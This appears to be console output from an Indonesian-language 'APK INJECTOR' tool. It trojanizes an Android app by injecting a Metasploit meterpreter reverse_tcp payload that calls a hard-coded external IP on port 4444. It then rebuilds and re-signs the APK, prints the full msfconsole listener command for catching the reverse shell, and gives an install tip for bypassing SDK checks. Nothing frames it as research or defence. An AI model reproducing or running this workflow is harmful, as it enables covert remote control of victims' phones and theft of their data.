=== APK INJECTOR ===
[*] Target: original.apk
[*] LHOST: 8.215.192.205
[*] LPORT: 4444
[*] Memeriksa dependensi...
[*] Menyiapkan environment...
[*] Memproses APK...
[1/5] Menghapus signature lama...
[2/5] Mendekompilasi APK...
[3/5] Menyuntikkan payload...
[-] No platform was selected, choosing Msf::Module::Platform::Android from the payload
[-] No arch selected, selecting arch: dalvik from the payload
No encoder specified, outputting raw payload
Payload size: 10232 bytes
Saved as: /root/bacdoor-apk/apk_work_sMWVl2/payload.apk
[4/5] Membangun APK baru...
[5/5] Menandatangani APK...
[√] Berhasil! APK termodifikasi: original_mod.apk
[*] Listener command:
msfconsole -q -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 8.215.192.205; set LPORT 4444; set ExitOnSession false; run'
[!] Catatan: Aplikasi mungkin perlu diinstal dengan --bypass-low-target-sdk
[*] Membersihkan temporary files...
